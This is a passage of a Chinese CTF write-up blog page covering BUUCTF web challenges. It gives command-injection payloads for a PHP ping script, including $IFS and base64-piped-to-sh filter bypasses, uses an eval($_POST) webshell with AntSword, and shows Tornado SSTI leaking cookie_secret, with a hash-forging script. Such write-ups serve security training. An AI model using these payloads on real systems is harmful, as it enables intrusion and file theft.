<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload：http:<span class="comment">//9132489d-c67f-40ae-9c5f-08f47ccd3e19.node3.buuoj.cn/?ip=123;cat$IFS`ls`</span></span><br><span class="line">其它的解法：</span><br><span class="line">拼接绕过，/?ip=<span class="number">123</span>;a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php;</span><br><span class="line">编码绕过，/?ip=<span class="number">123</span>;<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>“我家菜刀丢了，你能帮我找一下么，<code>eval($_POST[&quot;Syc&quot;]);</code>”，蚁剑直连，在根目录下拿到flag</p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开网页存在三个文件，<code>/flag.txt</code>显示<code>flag in /fllllllllllllag</code>，<code>/welcome.txt</code>显示<code>render</code>，<code>/hints.txt</code>显示<code>md5(cookie_secret+md5(filename))</code>，</p>
+<p>观察url，发现有两个参数，一个是<code>filename</code>，还有一个是<code>filehash</code>，说明要访问<code>/fllllllllllllag</code>，需要对应的hash值，而<code>/hints.txt</code>文件给出了如何求hash值，可是缺少<code>cookie_secret</code>，</p>
+<p>直接访问<code>/fllllllllllllag</code>不加另一个参数，回显为”Error“，此时url为<code>url/error?msg=Error</code>，题目tornado是python的web框架，所以这应该是要模板注入，尝试<code>url/error?msg=&#123;&#123;1&#125;&#125;</code>，回显为1，确实存在SSTI，但我实在不知道如何得知这个参数的，看WP输入<code>url/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>，找到<code>cookie_secret</code>，写脚本，最后传参就能得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    md5 = hashlib.md5()<span class="comment">#构造一个md5()函数对象</span></span><br><span class="line">    md5.update(s.encode(<span class="string">&quot;utf8&quot;</span>))<span class="comment">#添加数据</span></span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()<span class="comment">#转换成16进制str类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span>():</span></span><br><span class="line">    filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">    cookie_secret = <span class="string">&#x27;c1accea7-db83-46cf-afe5-fc3aee2a60b7&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(md5(cookie_secret + md5(filename)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filehash()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-web/" rel="tag"># CTF-web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/24/BugkuCTFweb25-33/" rel="prev" title="BugkuCTF web25-33">
+      <i class="fa fa-chevron-left"></i> BugkuCTF web25-33
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">5.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">6.</span> <span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">8.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="nav-number">9.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">10.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="nav-number">11.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">12.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">BkingXD</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BkingXD</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
